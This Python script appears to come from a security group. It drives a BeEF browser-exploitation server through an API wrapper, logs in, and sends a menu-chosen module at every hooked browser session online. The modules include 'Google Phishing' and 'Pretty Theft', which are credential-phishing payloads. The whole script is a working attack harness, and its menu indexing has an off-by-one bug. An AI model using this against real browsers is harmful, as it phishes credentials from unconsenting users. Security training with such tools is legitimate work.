import os
from dotenv import load_dotenv
from beef_api import BeefAPI, ResultPoller


load_dotenv()


TARGET_EXPLOIT_NAMES = ["Create Alert Dialog", "Google Phishing",
                        "Pretty Theft", "Fake Notification Bar"]

HOSTNAME = os.getenv("HOSTNAME", "https://beef.nullsecsig.com")
LOGINNAME = os.getenv("LOGINNAME")
PASSWORD = os.getenv("PASSWORD")

if LOGINNAME == None:
    LOGINNAME = input("Login name: ")
if PASSWORD == None:
    PASSWORD = input("Password: ")


beef = BeefAPI(HOSTNAME)
result_poller = ResultPoller(beef)

beef.login(LOGINNAME, PASSWORD)
result_poller.start()

target_exploits = beef.get_exploits_of_names(TARGET_EXPLOIT_NAMES)

while True:
    # Print menu
    for count, exploit_name in enumerate(TARGET_EXPLOIT_NAMES):
        print(f"[{count}] {exploit_name}")

    # Get user input
    while True:
        try:
            exploit_index = int(input("Choose an exploit: "))
            break
        except:
            print("invalid input! Please try again.")
            continue

    online_sessions = beef.get_online_sessions()
    online_session_ids = [session["session"]
                          for session in online_sessions.values()]

    commands = beef.execute_exploit(online_session_ids,
                                    target_exploits[TARGET_EXPLOIT_NAMES[exploit_index - 1]]["id"])
    result_poller.add_recent(commands)
